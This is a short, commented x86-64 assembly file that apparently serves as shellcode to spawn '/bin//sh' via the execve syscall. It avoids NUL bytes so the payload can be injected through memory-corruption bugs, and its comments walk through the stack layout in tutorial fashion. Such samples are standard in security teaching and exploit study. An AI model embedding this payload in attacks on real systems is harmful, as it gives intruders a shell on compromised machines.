.global _start

_start:
    # Goal: execve("/bin//sh", argv, NULL)
    # x86-64 syscall number for execve -> 59 (rax = 59)
    # Syscall calling convention:
    #   rdi = pointer to path
    #   rsi = pointer to argv[] (array of pointers, NULL-terminated)
    #   rdx = pointer to envp[] (NULL here)

    xor    %rdx, %rdx                  # rdx = 0  (envp = NULL, also used as our NUL terminator)

    movq   $0x68732f2f6e69622f, %rbx   # 8 bytes: "/bin//sh" (little-endian in memory)
    push   %rdx                        # push NUL terminator first (bottom of the string)
    push   %rbx                        # then push the string itself -> "/bin//sh\0" sits on the stack
    mov    %rsp, %rdi                  # rdi = pointer to "/bin//sh"

    push   %rdx                        # argv[1] = NULL
    push   %rdi                        # argv[0] = pointer to path string
    mov    %rsp, %rsi                  # rsi = pointer to argv[] = { path, NULL }

    xor    %rax, %rax
    mov    $59, %al                    # rax = 59 (SYS_execve) — use al, not eax, to avoid extra zero bytes

    syscall